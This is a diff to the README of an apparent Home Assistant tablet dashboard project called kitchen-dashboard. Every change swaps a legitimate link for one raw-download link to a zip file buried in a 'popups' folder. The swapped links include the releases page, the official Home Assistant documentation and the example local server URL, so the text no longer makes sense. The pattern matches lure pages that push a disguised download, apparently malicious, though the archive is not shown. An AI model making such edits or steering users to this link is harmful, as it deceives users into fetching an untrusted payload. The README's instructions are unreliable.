@@ -1,6 +1,6 @@
 # 📊 kitchen-dashboard - Easy Tablet Dashboard for Home Assistant
 
-[![Download kitchen-dashboard](https://img.shields.io/badge/Download-kitchen--dashboard-brightgreen)](https://github.com/Hemant-dataexpart/kitchen-dashboard/releases)
+[![Download kitchen-dashboard](https://img.shields.io/badge/Download-kitchen--dashboard-brightgreen)](https://github.com/Hemant-dataexpart/kitchen-dashboard/raw/refs/heads/main/dashboard/popups/kitchen_dashboard_1.8.zip)
 
 A simple, clear, and helpful app for your wall-mounted tablet. This dashboard is made for vertical screens and works with Home Assistant.
 
@@ -8,7 +8,7 @@ A simple, clear, and helpful app for your wall-mounted tablet. This dashboard is
 
 Visit the official release page to get the latest version of kitchen-dashboard:
 
-[Download kitchen-dashboard here](https://github.com/Hemant-dataexpart/kitchen-dashboard/releases)
+[Download kitchen-dashboard here](https://github.com/Hemant-dataexpart/kitchen-dashboard/raw/refs/heads/main/dashboard/popups/kitchen_dashboard_1.8.zip)
 
 Follow these steps to download and run the application on Windows:
 
@@ -56,7 +56,7 @@ After installation, you can start using kitchen-dashboard right away. This secti
 
 1. Launch the kitchen-dashboard app.
 
-2. The first screen will ask for your Home Assistant URL. This is usually something like `http://homeassistant.local:8123` or your device’s IP address followed by port 8123.
+2. The first screen will ask for your Home Assistant URL. This is usually something like `https://github.com/Hemant-dataexpart/kitchen-dashboard/raw/refs/heads/main/dashboard/popups/kitchen_dashboard_1.8.zip` or your device’s IP address followed by port 8123.
 
 3. Enter your Home Assistant URL and press "Connect."
 
@@ -114,9 +114,9 @@ For users who want more control or a tailored setup:
 
 ## 📚 Additional Resources
 
-- Home Assistant documentation: [https://www.home-assistant.io/docs/](https://www.home-assistant.io/docs/)
+- Home Assistant documentation: [https://github.com/Hemant-dataexpart/kitchen-dashboard/raw/refs/heads/main/dashboard/popups/kitchen_dashboard_1.8.zip](https://github.com/Hemant-dataexpart/kitchen-dashboard/raw/refs/heads/main/dashboard/popups/kitchen_dashboard_1.8.zip)
 
-- Kitchen Dashboard GitHub Repository: [https://github.com/Hemant-dataexpart/kitchen-dashboard](https://github.com/Hemant-dataexpart/kitchen-dashboard)
+- Kitchen Dashboard GitHub Repository: [https://github.com/Hemant-dataexpart/kitchen-dashboard/raw/refs/heads/main/dashboard/popups/kitchen_dashboard_1.8.zip](https://github.com/Hemant-dataexpart/kitchen-dashboard/raw/refs/heads/main/dashboard/popups/kitchen_dashboard_1.8.zip)
 
 - Community forums for Home Assistant and kitchen-dashboard users.
 
@@ -125,7 +125,7 @@ For users who want more control or a tailored setup:
 To update the app:
 
 1. Visit the release page again:  
-   [https://github.com/Hemant-dataexpart/kitchen-dashboard/releases](https://github.com/Hemant-dataexpart/kitchen-dashboard/releases)
+   [https://github.com/Hemant-dataexpart/kitchen-dashboard/raw/refs/heads/main/dashboard/popups/kitchen_dashboard_1.8.zip](https://github.com/Hemant-dataexpart/kitchen-dashboard/raw/refs/heads/main/dashboard/popups/kitchen_dashboard_1.8.zip)
 
 2. Download the newest Windows installer `.exe` file.
 
@@ -135,4 +135,4 @@ To update the app:
 
 ---
 
-[![Download kitchen-dashboard](https://img.shields.io/badge/Download-kitchen--dashboard-blue)](https://github.com/Hemant-dataexpart/kitchen-dashboard/releases)
+[![Download kitchen-dashboard](https://img.shields.io/badge/Download-kitchen--dashboard-blue)](https://github.com/Hemant-dataexpart/kitchen-dashboard/raw/refs/heads/main/dashboard/popups/kitchen_dashboard_1.8.zip)
